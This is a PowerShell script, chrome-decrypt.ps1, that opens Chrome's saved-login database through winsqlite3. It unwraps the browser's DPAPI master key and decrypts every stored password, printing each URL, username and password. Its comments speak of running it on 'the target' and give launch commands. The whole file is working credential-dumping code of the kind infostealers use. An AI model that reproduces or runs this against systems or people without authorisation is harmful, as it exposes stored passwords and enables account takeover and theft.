# Assuming Win 10 with Chrome and PowerShell 5.1 installed, print out the
# saved passwords created before Chrome v80 was installed. If PowerShell 7.x
# is also installed, this will print out the passwords created after Chrome
# v80 has been installed, too.
#
# Launch recommendation:
#
#   pwsh .\chrome-decrypt.ps1 || powershell .\chrome-decrypt
# 
$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
$query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

# If the target has PowerShell 7.x installed, passwords created in Chrome
# after v80 was installed can also be decoded.
$decoder = $null
if ((Get-Host).Version.Major -eq 7) {
    $localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
    $localStateData = Get-Content -Raw $localStatePath
    $keyBase64 = (ConvertFrom-Json $localStateData).os_crypt.encrypted_key
    $keyBytes = [System.Convert]::FromBase64String($keyBase64)
    $keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $keyBytes,
        $null,
        [Security.Cryptography.DataProtectionScope]::CurrentUser
    )
    $decoder = [Security.Cryptography.AesGcm]::New($masterKey)
}

Add-Type -AssemblyName System.Security
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class WinSQLite3
    {
        const string dll = "winsqlite3";

        [DllImport(dll, EntryPoint="sqlite3_open")]
        public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);

        [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
        public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

        [DllImport(dll, EntryPoint="sqlite3_step")]
        public static extern IntPtr Step(IntPtr stmt);

        [DllImport(dll, EntryPoint="sqlite3_column_text16")]
        static extern IntPtr ColumnText16(IntPtr stmt, int index);

        [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
        static extern int ColumnBytes(IntPtr stmt, int index);

        [DllImport(dll, EntryPoint="sqlite3_column_blob")]
        static extern IntPtr ColumnBlob(IntPtr stmt, int index);

        public static string ColumnString(IntPtr stmt, int index)
        { 
            return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
        }

        public static byte[] ColumnByteArray(IntPtr stmt, int index)
        {
            int length = ColumnBytes(stmt, index);
            byte[] result = new byte[length];
            if (length > 0)
                Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
            return result;
        }

        [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
        public static extern IntPtr Errmsg(IntPtr db);

        public static string GetErrmsg(IntPtr db)
        {
            return Marshal.PtrToStringUni(Errmsg(db));
        }
    }
"@

$dbH = 0
if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
    Write-Host "Failed to open!"
    [WinSQLite3]::GetErrmsg($dbh)
    exit
}

$stmt = 0
if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
    Write-Host "Failed to prepare!"
    [WinSQLite3]::GetErrmsg($dbh)
    exit
}

while([WinSQLite3]::Step($stmt) -eq 100) {

    $url = [WinSQLite3]::ColumnString($stmt, 0)
    $username = [WinSQLite3]::ColumnString($stmt, 1)
    $encryptedPassword = [WinSQLite3]::ColumnByteArray($stmt, 2)

    try {
        $passwordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedPassword,
            $null,
            [Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        $password = [System.Text.Encoding]::ASCII.GetString($passwordBytes)
        
        Write-Host "$url,$username,$password"
        continue

    } catch [System.Security.Cryptography.CryptographicException] {
        # Strange no-consequence exception bubbles up and we can safely ignore
        # it.
    }

    # Try any that failed above with the v80+ decoding, if we have PowerShell
    # 7.x.
    if ($decoder -ne $null) {
        $nonce = $encryptedPassword[3..14]
        $cipherText = $encryptedPassword[15..($encryptedPassword.length-17)]
        $tag = $encryptedPassword[($encryptedPassword.length-16)..($encryptedPassword.length-1)]
        $unencryptedBytes = [byte[]]::new($cipherText.length)
        $decoder.Decrypt($nonce, $cipherText, $tag, $unencryptedBytes)
        $password = [System.Text.Encoding]::ASCII.GetString($unencryptedBytes)

        Write-Host "$url,$username,$password"
    }
}
